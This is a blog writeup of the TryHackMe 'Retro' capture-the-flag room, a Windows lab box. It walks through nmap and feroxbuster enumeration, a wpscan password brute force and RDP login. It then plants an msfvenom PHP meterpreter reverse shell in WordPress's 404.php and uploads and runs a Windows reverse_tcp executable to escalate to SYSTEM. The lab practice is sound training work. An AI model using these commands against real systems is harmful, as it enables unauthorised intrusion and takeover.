+++
title = "THM - Retro writeup"
date = "2024-01-02T19:04:04+02:00"
tags = ["tryhackme", "wireshark", "windows", "nmap", "feroxbuster", "wpscan", "smb", "wordpress", "meterpreter"]
aliases = ["/2024/01/02/thm-retro/"]
categories = ["Pentesting", "Writeup", "CTF"]
showTableOfContents = true
showHeadingAnchors = true
heroStyle = "background"
showHero = true
+++

Hi,

this is my Writeup for the [Retro](https://tryhackme.com/room/retro) box of
[TryHackMe](https://tryhackme.com). This box is the final room of the
[Offensive Pentesting](https://tryhackme.com/paths) path.

## Information gathering

First I have to know what is in front of me. So I started the machine and after
that start with nmap.

```bash
nmap -Pn -p- TARGET_MACHINE_IP -oN ports
```


That scan reveals two open ports:

- 80 which is running a webserver
- 3389 which is the rdp service

To get the running services, I always use this command:

```bash
nmap -Pn -sC -sV -p $(grep -Po '[0-9]*(?=/tcp)' ports | tr '\n' ', ') TARGET_MACHINE_IP -oN services
```


<!--more-->

## A web server is running on the target. What is the hidden directory which the website lives on?

To answer this question, I used my favorit content discovery tool:
[feroxbuster](https://github.com/epi052/feroxbuster).

```bash
feroxbuster -w /PATH/TO/SECLISTS/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://TARGET_MACHINE_IP
```


![ferox_scan.png](/images/retro/ferox_scan.png)

There is the (not so) hidden directory. And another interesting thing showed up:
`wp-content`. So there is wordpress running. Good to know.

## user.txt

This one is easier then I thought. When looking around the blog entries from the
hidden directory, it is clear that the user `Wade` which has posted all the
entries, should be the username itself for wordpress and/or rdp session. I did
what every beginner would do: Start wpscan before further investigation.

```bash
wpscan --url http://TARGET_MACHINE_IP/*****/wp-login.php --usernames ["Wade"] --passwords /PATH/TO/rockyou.txt -t 200
```


But this takes very long. While I'm writing this, it is still running for about
25 min so far. I decided to read the blog entries, because I have to wait
anyway. And there it was! A suspecious blog entry:

![sus_entry.png](/images/retro/sus_entry.png)

comment section of this blog entry, I found the password in cleartext. And glad
I do so, because the cracking process was at this point after 41 min:

```
Trying [Wade] / carla Time: 00:41:33 <      > (1332 / 14344398)
```


> But the password is at position >1'400'000. So 41 min for position 1'332.
> Spare your time and read through the blog instead of bruteforcing it.


After that, I used the credentials to login via rdp with the user `Wade`. And it
was succesful. Also login with the same credentials over wordpress login page
was succesful. On the users desktop, there lays a file named `user.txt`
contains the flag.

## root.txt

To get the root flag, it is obvious that some privelege escalation should be
done. A [cheatsheet](https://0xsp.com/offensive/privilege-escalation-cheatsheet)
should help us to start. Now the systeminfo command helps us alot:

![sysinfo.png](/images/retro/sysinfo.png)

The version could be important. I decided to check the build version with the so
called
«[common kernel exploits](https://0xsp.com/offensive/privilege-escalation-cheatsheet/#Common_Kernel_Exploits)».
Glad microsoft has a list on the side to check even faster:
[securitybulletins](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-014).

No one of the MS16-0\*'s would work here. Just `CVE-2020-0796` and
`CVE-2019-1388`.

#### CVE-2020-0796

To check for this vulnerability, I read this article:
[SMBGhost - An Overview of CVE-2020-0796](https://www.keysight.com/blogs/en/tech/nwvs/2022/02/11/smbghost-an-overview-of-cve-2020-0796).
To be affected, the version should be `10.0.18362.329` for the file `srv2.sys`

![srv2sys.png](/images/retro/srv2sys.png)

But smbv3 seems not enabled:

![smbv3Disabled.png](/images/retro/smbv3Disabled.png)

In this case we are not affected. Sadly. But move on to the last vulnerability
of the list.

#### CVE-2019-1388

By searching for the vulnerability and the
[KB](https://en.wikipedia.org/wiki/Microsoft_Knowledge_Base) on google, I found
this blog page :
[Patch Windows Certificate Dialog Elevation of Privilege Vulnerability](https://blog.invgate.com/patch-cve-2019-1388#about-cve)
This linked the
[list of patches for every system](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-1388).
With this, we get the KB number: `KB4519976`

![KBnumber.png](/images/retro/KBnumber.png)

Yes! The target machine is vulnerable to cve-2019-1388! And ye, this is a easy
room so there was another hint, that this vulnerability should be used:

![trash.png](/images/retro/trash.png)

This is the exploit which is used for cve-2019-1388.

I found a Video which explains very good, how to do so:

{{< youtube 3BQKpPNlTSo >}}

I followed all the steps but there was a problem:

![noBrowser.png](/images/retro/noBrowser.png)

Now this is not working and even the workaround, which could be found in other
writeups, where you have to initialize IE and Google Chrome browser before you
try to exploit, didn't work for me.

#### MS16-075

Because I was so desperate, I looked at the previous MS16-0\* vulnerabilities. I
thought there must be another way in! How do I check this? Now it seems that we
are, because our user is low priv, not able to check for installed
updates/patches. To check, I decided to run the exploit.

But it fails because the user «Wade» is missing some previleges:

![FailedMS1675.png](/images/retro/FailedMS1675.png)

I almost gave up on this vulnerability, but then I thought about it. There is a
wordpress running. I bet it is running from a different user! Lets check the
wordpress admin dashboard.

![wplogin.png](/images/retro/wplogin.png)

Yes, the 404.php for example can be edited. To get a reverse shell there, we can
use msfvenom.

Create the payload:

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=VPN_TUN_IP LPORT=4445 -f raw > rev.php
```


![404html.png](/images/retro/404html.png)

Now when the payload is created, copy the content of the rev.php file into the
404.php and save/update the file. After that, when navigating to a page which is
not existing, the php-code would be triggered. Right before, start msfconsole
and use the `exploit/multi/handler`.

![meterpreter.png](/images/retro/meterpreter.png)

Now we have a php-meterpreter as the user «IUSR». And I write php-meterpreter
because you have to know that this is another kind of meterpreter than the tcp
one. And to get a «normal» tcp reverse shell, we can do the same from here.

First create the exploit:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=VPN_TUN_IP LPORT=4444 -f exe -o revtcp.exe
```


After that, you can upload it from the php-meterpreter session:

```
meterpreter > upload revtcp.exe
```


I had to change the directory to C:\temp (just created the temp folder) because
we have no permission to upload the file anywhere. Now, when you have prepared
another multi handler listener for the tcp reverse shell, you can run the
payload and you have a normal meterpreter which should work for the ms16_075
exploit.

```
meterpreter > execute -f revtcp.exe
```


But even with this, the exploit is not successful.

![noMS16.png](/images/retro/noMS16.png)

As I tried to figure it out what the problem may cause, I saw a cheap weapon
while scrolling trough the help output of meterpreter.

![ShouldI.png](/images/retro/ShouldI.png)

And with this automated action, I was able to gain system privilege. But I call
it «cheap» because it is like other automated scanning tools. You dont need to
search and understand yourself, the tool is gonna do it for you. But this time,
I gave it a try, because all vulnerabilities who should work, are for some
reason not working. I read walkthroughs about this room and they all have solve
it with the two vulnerabilities which I tried first. And in the end: Cracked is
cracked.

![getRoot.png](/images/retro/getRoot.png)

Now with system priv you should be able to search for the root.txt file.

```powershell
Get-ChildItem -Path C:\ -Include *root.txt* -File -Recurse -ErrorAction SilentlyContinue
```


Good luck :)

---

{{<figure
src="/images/darksoulsMeme.png"
nozoom=true
>}}
